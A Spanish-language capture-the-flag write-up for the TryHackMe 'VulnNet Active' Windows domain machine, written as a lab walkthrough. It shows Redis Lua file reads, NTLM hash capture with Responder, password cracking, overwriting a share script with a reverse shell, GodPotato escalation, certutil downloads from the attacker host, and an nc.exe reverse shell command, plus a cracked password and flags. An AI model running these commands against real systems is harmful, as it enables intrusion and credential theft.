---
tags:
title: VulnNet Active - Medium (THM)
permalink: /VulnNet-Active-THM-Writeup
toc: true
toc_label: Topics
toc_sticky: true
sidebar: main
---
---
# Recon

```bash 
nmapf 10.66.132.170
Nmap Full scan in progress
Starting Nmap 7.98 ( https://nmap.org ) at 2026-03-13 11:47 -0400
Initiating Ping Scan at 11:47
Scanning 10.66.132.170 [4 ports]
Completed Ping Scan at 11:47, 0.31s elapsed (1 total hosts)
Initiating Parallel DNS resolution of 1 host. at 11:47
Completed Parallel DNS resolution of 1 host. at 11:47, 0.50s elapsed
Initiating SYN Stealth Scan at 11:47
Scanning 10.66.132.170 [65535 ports]
Discovered open port 53/tcp on 10.66.132.170
Discovered open port 139/tcp on 10.66.132.170
Discovered open port 445/tcp on 10.66.132.170
Discovered open port 135/tcp on 10.66.132.170
Discovered open port 464/tcp on 10.66.132.170
Discovered open port 49705/tcp on 10.66.132.170
Discovered open port 9389/tcp on 10.66.132.170
Discovered open port 49690/tcp on 10.66.132.170
Discovered open port 49669/tcp on 10.66.132.170
Discovered open port 49667/tcp on 10.66.132.170
Discovered open port 49670/tcp on 10.66.132.170
Discovered open port 49668/tcp on 10.66.132.170
Discovered open port 6379/tcp on 10.66.132.170
Discovered open port 49671/tcp on 10.66.132.170
Completed SYN Stealth Scan at 11:47, 13.54s elapsed (65535 total ports)
Nmap scan report for 10.66.132.170
Host is up, received echo-reply ttl 126 (0.19s latency).
Scanned at 2026-03-13 11:47:13 EDT for 14s
Not shown: 65521 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT      STATE SERVICE      REASON
53/tcp    open  domain       syn-ack ttl 126
135/tcp   open  msrpc        syn-ack ttl 126
139/tcp   open  netbios-ssn  syn-ack ttl 126
445/tcp   open  microsoft-ds syn-ack ttl 126
464/tcp   open  kpasswd5     syn-ack ttl 126
6379/tcp  open  redis        syn-ack ttl 126
9389/tcp  open  adws         syn-ack ttl 126
49667/tcp open  unknown      syn-ack ttl 126
49668/tcp open  unknown      syn-ack ttl 126
49669/tcp open  unknown      syn-ack ttl 126
49670/tcp open  unknown      syn-ack ttl 126
49671/tcp open  unknown      syn-ack ttl 126
49690/tcp open  unknown      syn-ack ttl 126
49705/tcp open  unknown      syn-ack ttl 126

Read data files from: /usr/share/nmap
Nmap done: 1 IP address (1 host up) scanned in 14.48 seconds
           Raw packets sent: 131063 (5.767MB) | Rcvd: 32 (2.297KB)
-e [*] IP: 10.66.132.170
[*] Puertos abiertos: 53,135,139,445,464,6379,9389,49667,49668,49669,49670,49671,49690,49705
/usr/bin/xclip
-e [*] Service scanning with nmap against 53,135,139,445,464,6379,9389,49667,49668,49669,49670,49671,49690,49705 Ports..
Starting Nmap 7.98 ( https://nmap.org ) at 2026-03-13 11:47 -0400
Nmap scan report for 10.66.132.170
Host is up (0.19s latency).

PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
6379/tcp  open  redis         Redis key-value store 2.8.2402
9389/tcp  open  mc-nmf        .NET Message Framing
49667/tcp open  msrpc         Microsoft Windows RPC
49668/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49669/tcp open  msrpc         Microsoft Windows RPC
49670/tcp open  msrpc         Microsoft Windows RPC
49671/tcp open  msrpc         Microsoft Windows RPC
49690/tcp open  msrpc         Microsoft Windows RPC
49705/tcp open  msrpc         Microsoft Windows RPC
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time:
|   date: 2026-03-13T15:48:24
|_  start_date: N/A
| smb2-security-mode:
|   3.1.1:
|_    Message signing enabled and required
|_clock-skew: -10s

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 104.82 seconds
```
## Redis File read

Como el puerto de `redis` estaba abierto use la siguiente guia de [esta pagina](https://www.agarri.fr/blog/archives/2014/09/11/trying_to_hack_redis_via_http_requests/index.html) para poder escapar del sandbox de `Lua` para poder leer archivos locales del sistema.
Para eso puedo usar el comando `EVAL`, donde luego el sandobox me permite ejecutar `dofile()` para poder leer archivos o directorios.

```bash
redis-cli -h 10.66.132.170 eval 'dofile("C:\\Users\\enterprise-security\\Desktop\\user.txt")' 0
(error) ERR Error running script (call to f_cb15a06e714f8f0c03c76ca385dee3b04b44d565): @user_script:1: C:\Users\enterprise-security\Desktop\user.txt:1: malformed number near '3eb176aee96432d5b100bc93580b291e'
```
## Shell as enterprise-security
### Hash theft

Puedo usar la propia funcionalidad para hacer que el servidor intente cargar un archivo el cual no existe en mi maquina, haciendo que luego de que trate de autenticarse, yo poder ver el hash `NTLM` con `Responder`.

```bash
redis-cli -h 10.66.132.170 eval 'dofile("//192.168.210.140/whoami")' 0
(error) ERR Error running script (call to f_05c75bdc3cd509c507a2012ea4067cc039d1fe49): @user_script:1: cannot open //192.168.210.140/whoami: Permission denied
```

Y asi obtuve el hash del usuario `enterprise-security`
```bash
zs1n@ptw ~> sudo responder -I tun0

..snip..

[SMB] NTLMv2-SSP Client   : 10.66.132.170
[SMB] NTLMv2-SSP Username : VULNNET\enterprise-security
[SMB] NTLMv2-SSP Hash     : enterprise-security::VULNNET:22464c80658c3827:58C4A651AB3D7A3C3FC2B832A395F222:0101000000000000801BCA6BE3B2DC0113532B83348C80E800000000020008004C004C003400520001001E00570049004E002D005700460055004C0030004400470047004F004100530004003400570049004E002D005700460055004C0030004400470047004F00410053002E004C004C00340052002E004C004F00430041004C00030014004C004C00340052002E004C004F00430041004C00050014004C004C00340052002E004C004F00430041004C0007000800801BCA6BE3B2DC01060004000200000008003000300000000000000000000000003000007E44B82235D94F4A2B18D1C47933744A16784BFC640F06A7E89CE881CB41221A0A001000000000000000000000000000000000000900280063006900660073002F003100390032002E003100360038002E003200310030002E003100340030000000000000000000
```
### Crack password

Rompi el mismo con `john`.

```bash
└─# j hash
Using default input encoding: UTF-8
Loaded 1 password hash (netntlmv2, NTLMv2 C/R [MD4 HMAC-MD5 32/64])
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
sand_0873959498  (enterprise-security)
1g 0:00:00:01 DONE (2026-03-13 12:21) 0.5291g/s 2123Kp/s 2123Kc/s 2123KC/s sandoval69..sand36
Use the "--show --format=netntlmv2" options to display all of the cracked passwords reliably
Session completed.
```
### Script 

Con estas credenciales me conecte con `smbclient` , viendo asi en el recurso compartido `Enterprise-Share` un script de PowerShell.

```bash
 impacket-smbclient vulnnet.local/enterprise-security:sand_0873959498@VULNNET-BC3TCK1.vulnnet.local -dc-ip 10.66.132.170
Impacket v0.14.0.dev0+20260219.104542.8728bbcf - Copyright Fortra, LLC and its affiliated companies

Type help for list of commands
# shares
ADMIN$
C$
Enterprise-Share
IPC$
NETLOGON
SYSVOL
# use Enterprise-Share
# ls
drw-rw-rw-          0  Tue Feb 23 17:45:41 2021 .
drw-rw-rw-          0  Tue Feb 23 17:45:41 2021 ..
-rw-rw-rw-         69  Tue Feb 23 19:33:18 2021 PurgeIrrelevantData_1826.ps1
# get PurgeIrrelevantData_1826.ps1
```
### Overwrite script

Como el archivo lo puedo sobreescribir, use una reverse shell de [este repo](https://github.com/martinsohn/PowerShell-reverse-shell/blob/main/powershell-reverse-shell.ps1) de Github, solo que en mi caso le cambie la dirección `ip`.
Ademas como no puedo borrarlo, solo puedo subir el mio con `put`

```bash
# ls
drw-rw-rw-          0  Fri Mar 13 13:00:04 2026 .
drw-rw-rw-          0  Fri Mar 13 13:00:04 2026 ..
-rw-rw-rw-         69  Tue Feb 23 19:33:18 2021 PurgeIrrelevantData_1826.ps1
# rm PurgeIrrelevantData_1826.ps1
[-] SMB SessionError: code: 0xc0000022 - STATUS_ACCESS_DENIED - {Access Denied} A process has requested access to an object but has not been granted those access rights.
# put PurgeIrrelevantData_1826.ps1
# ls
drw-rw-rw-          0  Fri Mar 13 13:00:04 2026 .
drw-rw-rw-          0  Fri Mar 13 13:00:04 2026 ..
-rw-rw-rw-        515  Fri Mar 13 13:03:10 2026 PurgeIrrelevantData_1826.ps1
```
### Shell

Viendo como me llega la shell en mi otra consola.

```powershell
rlwrap nc -nvlp 4444
listening on [any] 4444 ...
connect to [192.168.210.140] from (UNKNOWN) [10.67.132.49] 49762
SHELL> whoami
vulnnet\enterprise-security
SHELL>
```

```powershell
SHELL> cd ../DESKTOP; ls


    Directory: C:\Users\enterprise-security\DESKTOP


Mode                LastWriteTime         Length Name                                       
----                -------------         ------ ----                                       
-a----        2/23/2021   8:24 PM             37 user.txt
```
## Shell as administrator
### SeImpersonate
Viendo los privilegios de este usuario en la maquina, veo que cuenta con el `SeImpersonatePrivilege`.

```powershell
vulnnet\enterprise-security
SHELL> whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                               State
============================= ========================================= ========
SeMachineAccountPrivilege     Add workstations to domain                Disabled
SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled
SeImpersonatePrivilege        Impersonate a client after authentication Enabled
SeCreateGlobalPrivilege       Create global objects                     Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set            Disabled
```
### GodPotato

Por lo que subi el GodPotato.exe de [este repo](https://github.com/BeichenDream/GodPotato/releases/) de Github, para abusar del mismo y convertirme en system.

```bash
PS C:\programdata> certutil -urlcache -split -f http://192.168.210.140/GodPotato-NET4.exe C:\programdata\GodPotato-NET4.exe
****  Online  ****
  0000  ...
  e000
CertUtil: -URLCache command completed successfully.
PS C:\programdata> .\GodPotato-NET4.exe -cmd "cmd.exe /c whoami"
[*] CombaseModule: 0x140725908471808
[*] DispatchTable: 0x140725910789296
[*] UseProtseqFunction: 0x140725910168192
[*] UseProtseqFunctionParamCount: 6
[*] HookRPC
[*] Start PipeServer
[*] Trigger RPCSS
[*] CreateNamedPipe \\.\pipe\797083eb-c63f-4879-8e38-ff00c9e0b260\pipe\epmapper
[*] DCOM obj GUID: 00000000-0000-0000-c000-000000000046
[*] DCOM obj IPID: 00009802-09d4-ffff-8998-0a80643271d3
[*] DCOM obj OXID: 0xd30c0158b9609294
[*] DCOM obj OID: 0x561f4e9ea7dc93ba
[*] DCOM obj Flags: 0x281
[*] DCOM obj PublicRefs: 0x0
[*] Marshal Object bytes len: 100
[*] UnMarshal Object
[*] Pipe Connected!
[*] CurrentUser: NT AUTHORITY\NETWORK SERVICE
[*] CurrentsImpersonationLevel: Impersonation
[*] Start Search System Token
[*] PID : 852 Token:0x804  User: NT AUTHORITY\SYSTEM ImpersonationLevel: Impersonation
[*] Find System Token : True
[*] UnmarshalObject: 0x80070776
[*] CurrentUser: NT AUTHORITY\SYSTEM
[*] process start with pid 2688
```

Como en el output del `whoami` me devolvió system, subí el `nc.exe`.

```
PS C:\programdata> certutil -urlcache -split -f http://192.168.210.140/nc.exe C:\programdata\nc.exe
****  Online  ****
  0000  ...
  6e00
CertUtil: -URLCache command completed successfully.
```
### Shell

Y luego me envié una shell con el mismo.

```powershell
PS C:\programdata> .\GodPotato-NET4.exe -cmd "cmd.exe /c C:\programdata\nc.exe 192.168.210.140 4444 -e cmd"
```

Recibiéndola desde mi otra consola nuevamente, como `system` de la maquina.

```bash
rlwrap nc -nvlp 4444
listening on [any] 4444 ...
connect to [192.168.210.140] from (UNKNOWN) [10.65.140.10] 49906
Microsoft Windows [Version 10.0.17763.1757]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32>
```

```powershell
C:\Users\Administrator\Desktop>type system.txt
type system.txt
THM{d540c0645975900e5bb9167aa431fc9b}
```

`~Happy Hacking.`
